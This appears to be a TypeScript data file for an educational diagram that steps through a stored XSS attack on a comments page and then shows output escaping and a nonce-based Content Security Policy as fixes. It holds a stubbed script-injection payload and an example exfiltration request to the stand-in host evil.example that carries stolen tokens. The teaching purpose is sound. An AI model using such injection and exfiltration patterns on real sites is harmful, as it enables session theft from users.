import type { FlowDefinition } from "../../../lib/flow/types";

/** Security roadmap → OWASP Top 10. */
export const xssCsp: FlowDefinition = {
  id: "xss-csp",
  title: "A stored XSS attack, then escaping and CSP",
  actors: [
    { id: "attacker", label: "Attacker", sublabel: "posts a comment", kind: "attacker", col: 0, row: 0 },
    { id: "app", label: "Web app", sublabel: "comments page", kind: "server", col: 1, row: 0 },
    { id: "victim", label: "Victim", sublabel: "signed-in user", kind: "client", col: 2, row: 0 },
    { id: "collector", label: "Collector", sublabel: "evil.example", kind: "attacker", col: 2, row: 1 },
  ],
  steps: [
    {
      id: "post",
      from: "attacker",
      to: "app",
      title: "Post a comment containing a script",
      payload: "<script>fetch(…)</script>",
      detail: "The comment box accepts any text. The attacker submits markup instead of words.",
    },
    {
      id: "store",
      from: "app",
      title: "Store it as is",
      payload: "INSERT INTO comments …",
      detail: "Storing raw text is fine. The bug comes later, when it is written into HTML without escaping.",
    },
    {
      id: "open",
      from: "victim",
      to: "app",
      title: "Open the page",
      payload: "GET /posts/42",
      detail: "Every reader of this post now receives the attacker's markup.",
    },
    {
      id: "render",
      from: "app",
      to: "victim",
      title: "Render the comment as HTML",
      payload: "…<script>fetch(…)</script>…",
      variant: "response",
      detail: "The server pastes the comment straight into the page, so the browser sees a real script tag.",
    },
    {
      id: "run",
      from: "victim",
      title: "Run the script as the site",
      payload: "same origin, full access",
      detail:
        "The script runs with the site's own origin. It can read the page, call the site's APIs as the user, and read tokens in localStorage or cookies without HttpOnly.",
    },
    {
      id: "exfil",
      from: "victim",
      to: "collector",
      title: "Send the data away",
      payload: "GET evil.example/?t=…",
      detail: "Stolen tokens or page data leave in an ordinary request.",
    },
    {
      id: "escape",
      from: "app",
      title: "Fix 1: escape on output",
      payload: "< becomes &lt;, shown as text",
      detail:
        "Encoding for the HTML context turns markup into plain text. React and most templates do this by default. innerHTML and dangerouslySetInnerHTML skip it.",
    },
    {
      id: "csp",
      from: "app",
      to: "victim",
      title: "Fix 2: send a CSP header",
      payload: "script-src 'nonce-r4nd0m'",
      variant: "response",
      detail:
        "A Content Security Policy is the safety net. The browser only runs scripts that carry this response's random nonce.",
    },
    {
      id: "block",
      from: "victim",
      title: "Block the injected script",
      payload: "Refused: violates CSP",
      detail: "If markup ever slips through, the injected script has no nonce and never runs.",
    },
  ],
};
